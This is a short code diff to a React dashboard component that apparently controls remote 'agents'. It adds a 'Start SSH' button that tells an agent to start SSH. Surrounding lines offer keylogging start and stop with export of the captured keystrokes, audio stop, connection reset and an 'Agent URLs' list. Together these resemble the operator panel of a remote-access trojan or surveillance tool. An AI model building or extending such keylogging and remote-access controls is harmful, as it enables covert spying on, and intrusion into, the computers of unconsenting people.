@@ -273,6 +273,10 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
             try { dashboardSocket.audioStop(agent.agent_id) } catch {}
             setLines((prev)=>[...prev, '[Stop All issued]'])
           }}>Stop All</button>
+          <button className="btn secondary" onClick={() => {
+            try { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'ssh_start' }) } catch {}
+            setLines((prev)=>[...prev, '[SSH start requested]'])
+          }}>Start SSH</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
           <button className="btn secondary" onClick={async () => { if (!keylogRunning) { dashboardSocket.startKeylog(agent.agent_id); setKeylogRunning(true); setShowKeylog(true); } else { dashboardSocket.stopKeylog(agent.agent_id); setKeylogRunning(false); try { await keylogRef.current?.exportAndSave() } catch {} } }}>{keylogRunning ? 'Stop Keylog' : 'Start Keylog'}</button>
           <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
